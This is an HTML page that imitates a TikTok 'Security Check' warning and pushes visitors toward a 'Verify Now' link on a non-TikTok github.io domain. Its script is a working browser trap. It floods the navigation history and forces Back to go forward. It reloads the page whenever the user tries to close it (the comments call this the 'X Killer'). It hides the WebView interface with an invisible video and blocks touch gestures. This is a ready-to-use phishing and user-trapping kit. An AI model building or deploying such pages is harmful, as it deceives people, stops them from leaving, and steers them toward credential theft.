<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; background: #ffffff; 
            height: 100vh; overflow: hidden;
            font-family: -apple-system, sans-serif;
        }

        /* THE GHOST VIDEO: This is the engine that hides the UI */
        #ghost-video {
            position: fixed;
            top: 0; left: 0;
            width: 1px; height: 1px;
            opacity: 0.01;
            z-index: -1;
        }

        #trap-zone {
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh; text-align: center; padding: 0 30px;
        }

        .icon { width: 64px; margin-bottom: 20px; }
        .title { font-size: 22px; font-weight: 700; color: #161823; }
        .desc { color: #8A8B91; margin: 15px 0 30px; line-height: 1.4; }
        
        #link { 
            background: #fe2c55; color: white; padding: 12px 40px; 
            border-radius: 4px; text-decoration: none; font-weight: 600;
        }

        /* BLOCKER: Prevents clicking anything but the link */
        #shield {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100; display: block;
        }
    </style>
</head>
<body>
    <div id="shield"></div>

    <video id="ghost-video" autoplay muted loop>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>

    <div id="trap-zone">
        <svg class="icon" viewBox="0 0 48 48" fill="none"><path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/><rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/><rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/></svg>
        <div class="title">Security Check</div>
        <div class="desc">Unusual traffic detected. Please verify your session to continue using TikTok.</div>
        <a id="link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html" style="z-index: 200; position: relative;">Verify Now</a>
    </div>

    <script>
        function engageImmersiveMode() {
            // 1. History Lockdown
            for(let i=0; i<30; i++) {
                history.pushState(null, null, location.href);
            }

            // 2. The Focus Trick
            // We force focus on the video element. In many WebViews, 
            // the 'X' button hides when the browser prepares for video playback.
            const vid = document.getElementById('ghost-video');
            vid.play().catch(() => {
                // If autoplay is blocked, the UI usually stays, 
                // but the focus intent is registered.
            });

            // 3. The 'X' Killer: Blur Hijack
            // When the user clicks the 'X', the page blurs.
            // We refresh so fast the browser can't finish the 'close' command.
            window.onblur = function() {
                location.replace(location.href);
            };

            // 4. Disable Gestures
            document.addEventListener('touchmove', (e) => e.preventDefault(), {passive: false});
        }

        window.onload = engageImmersiveMode;
        
        // Final Back Button Guard
        window.onpopstate = () => {
            history.forward();
        };
    </script>
</body>
</html>
